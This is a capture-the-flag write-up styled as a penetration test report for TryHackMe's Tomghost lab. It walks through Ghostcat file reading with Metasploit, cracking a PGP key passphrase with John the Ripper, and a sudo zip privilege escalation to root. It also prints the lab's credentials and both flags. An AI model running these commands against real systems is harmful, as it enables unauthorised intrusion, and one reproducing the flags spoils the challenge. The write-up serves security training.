Tomghost — Penetration Test Report

TryHackMe Easy · 2026-06-05

Target: 10.66.184.180 Date: 2026-06-05 Objective: Chain exploits to capture user.txt and root.txt

The Tomghost engagement targeted an Apache Tomcat 9.0.30 host. The exposed AJP connector was exploited via the Ghostcat vulnerability (CVE-2020-1938) to read the application's web.xml, which disclosed credentials for the skyfuck user. SSH access revealed an encrypted PGP credential file; cracking the private key's passphrase with John the Ripper decrypted credentials for the merlin user. Passwordless sudo access to zip was abused to execute commands as root and recover the root flag.

1. Reconnaissance

Port Scan

22/tcp   OpenSSH 7.2p2 Ubuntu
53/tcp   DNS (tcpwrapped)
8009/tcp Apache Jserv (AJP13) Protocol v1.3
8080/tcp Apache Tomcat 9.0.30

OS: Ubuntu 16.04.6 LTS (Xenial Xerus)

2. Initial Access — Ghostcat (CVE-2020-1938)

2.1 Vulnerability

Apache Tomcat 9.0.30 exposes the AJP connector on port 8009. The AJP protocol does not properly validate request attributes, allowing an unauthenticated attacker to read arbitrary files from the web application directory via a crafted AJP request (CVE-2020-1938).

2.2 Exploitation

Used the Metasploit auxiliary/admin/http/tomcat_ghostcat module to read /WEB-INF/web.xml:

msf6 > use auxiliary/admin/http/tomcat_ghostcat
msf6 > set RHOSTS 10.66.184.180
msf6 > set RPORT 8009
msf6 > set FILENAME /WEB-INF/web.xml
msf6 > run

2.3 Credential Discovery

The web.xml contained credentials in a comment:

User: skyfuck
Password: 8730281lkjlkjdqlksalks

SSH access as skyfuck was successful on port 22.

3. Lateral Movement — PGP Cracking

3.1 PGP Files

skyfuck's home directory contained:

  • credential.pgp — encrypted file
  • tryhackme.asc — ASCII-armored PGP private key

3.2 Key Passphrase Cracking

Extracted the PGP key hash with gpg2john and cracked it with John the Ripper using rockyou.txt:

$ gpg2john tryhackme.asc > hash.txt
$ john --wordlist=rockyou.txt hash.txt
...
alexandru        (tryhackme)

PGP Passphrase: alexandru

3.3 Decrypted Credentials

Decrypted credential.pgp with the imported private key:

merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j

3.4 User Flag

SSH as merlin:

$ ssh merlin@10.66.184.180
$ cat ~/user.txt

User Flag: THM{GhostCat_1s_so_cr4sy}

4. Privilege Escalation — Sudo Zip

4.1 Sudo Privileges

merlin had passwordless sudo access to /usr/bin/zip:

$ sudo -l
User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip

4.2 GTFOBins Exploitation

Used zip's -T --unzip-command to execute arbitrary commands as root:

$ sudo /usr/bin/zip /tmp/priv.zip /etc/hosts -T --unzip-command="cat /root/root.txt"

4.3 Root Flag

Root Flag: THM{Z1P_1S_FAKE}

6. Remediation Recommendations

  • Upgrade Tomcat: Version 9.0.30 is vulnerable to CVE-2020-1938. Update to 9.0.31+.
  • Disable AJP if unused: The AJP connector on port 8009 should be disabled or restricted to internal networks.
  • Encrypt credentials securely: PGP-encrypted credential files with weak passphrases are easily reversed. Use a secrets management solution instead.
  • Audit sudo privileges: /usr/bin/zip should not be accessible with NOPASSWD. Follow least-privilege principles.
